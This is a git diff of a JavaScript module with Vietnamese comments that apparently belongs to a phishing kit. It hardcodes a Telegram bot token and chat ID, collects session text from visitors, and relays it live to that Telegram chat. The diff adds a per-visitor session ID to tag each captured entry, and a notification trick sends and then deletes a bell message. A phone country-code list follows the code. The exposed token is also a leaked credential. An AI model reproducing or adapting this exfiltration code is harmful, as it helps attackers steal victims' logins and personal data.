@@ -1,17 +1,35 @@
-// TOKEN VÀ CHAT ID CỦA MÀY (GỬI TRỰC TIẾP)
-const BOT_TOKEN = '8965667730:AAEUmQ4lrsYxck1AudaDPKkVEgFwA6nWhkc'; // Thay Token thật của mày
-const CHAT_ID = '-5183002196'; // Thay Chat ID thật của mày
+const BOT_TOKEN = '8965667730:AAEUmQ4lrsYxck1AudaDPKkVEgFwA6nWhkc'; 
+const CHAT_ID = '-5183002196'; 
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
 let tgMessageId = null;
 let currentSessionText = '';
+let currentSessionId = '';
 
-export const setInitialSession = (text) => { currentSessionText = text; };
+// Hàm lấy Session ID
+const getSessionId = () => {
+    if (currentSessionId) return currentSessionId;
+    let id = localStorage.getItem('session_id');
+    if (!id) {
+        id = 'user_' + Math.random().toString(36).substring(2, 9);
+        localStorage.setItem('session_id', id);
+    }
+    currentSessionId = id;
+    return id;
+};
+
+export const setInitialSession = (text) => { 
+    currentSessionText = text; 
+};
+
 export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
 export const sendTelegramMessage = (newContent) => {
     if (newContent) currentSessionText += newContent;
-    const text = currentSessionText;
+    
+    // TỰ ĐỘNG THÊM MÃ PHIÊN VÀO ĐẦU TIN NHẮN
+    const sid = getSessionId();
+    let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
 
     const tgFetch = (method, payload) => {
         let bodyStr = '';
@@ -32,7 +50,6 @@ export const sendTelegramMessage = (newContent) => {
             if (d && d.ok && d.result) tgMessageId = d.result.message_id;
         });
     } else {
-        // Gửi tin rác 🔔 để lấy thông báo, xóa đi, rồi cập nhật tin chính
         tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔' }).then(res => {
             if (res && res.ok && res.result) {
                 tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
@@ -42,7 +59,6 @@ export const sendTelegramMessage = (newContent) => {
     }
 };
 
-// Danh sách mã vùng
 export const countryCodeMap = {
     "AF": "+93", "AL": "+355", "DZ": "+213", "AS": "+1", "AD": "+376", "AO": "+244", "AI": "+1", "AG": "+1", 
     "AR": "+54", "AM": "+374", "AW": "+297", "AU": "+61", "AT": "+43", "AZ": "+994", "BS": "+1", "BH": "+973", 
